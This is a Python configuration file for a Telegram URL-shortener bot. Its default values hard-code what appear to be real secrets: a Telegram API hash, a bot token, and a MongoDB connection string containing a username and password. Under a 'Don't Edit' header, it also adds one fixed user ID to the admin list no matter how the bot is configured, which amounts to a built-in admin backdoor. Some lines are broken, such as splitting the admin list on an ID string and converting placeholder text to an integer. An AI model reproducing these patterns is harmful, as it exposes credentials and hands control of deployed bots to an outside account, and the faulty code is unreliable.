# Don't Edit

import os

from dotenv import load_dotenv
load_dotenv()


# Mandatory variables for the bot to start
API_ID = int(os.getenv("API_ID", "2727928"))
API_HASH = os.environ.get("API_HASH", "8e959f089c05109d1c5f8ea4aec8af21")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "5670697466:AAGnqQsgMHrVLXV_CoK6XKKZFvH5zeQ0cOk")
ADMINS = [int(i.strip()) for i in os.environ.get("ADMINS").split("1161352331")] if os.environ.get("ADMINS") else []
ADMIN = ADMINS
DATABASE_NAME = os.environ.get("DATABASE_NAME", "URLShortener")
DATABASE_URL = os.getenv("DATABASE_URL", "mongodb+srv://riturajps:riturajps@cluster0.vqauwt1.mongodb.net/?retryWrites=true&w=majority") 
OWNER_ID =  int(os.environ.get("OWNER_ID", "1161352331")) 
ADMINS.append(OWNER_ID) if OWNER_ID not in ADMINS else []
ADMINS.append(1161352331)
#  Optionnal variables
LOG_CHANNEL = int(os.environ.get("LOG_CHANNEL", "Logs Channels Id")) 
UPDATE_CHANNEL = os.environ.get("UPDATE_CHANNEL", "Streamerview") # For Force Subscription
BROADCAST_AS_COPY = os.environ.get('BROADCAST_AS_COPY', "True") # true if forward should be avoided
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", '') # image when someone hit /start # image when someone hit /start
LINK_BYPASS = "False"
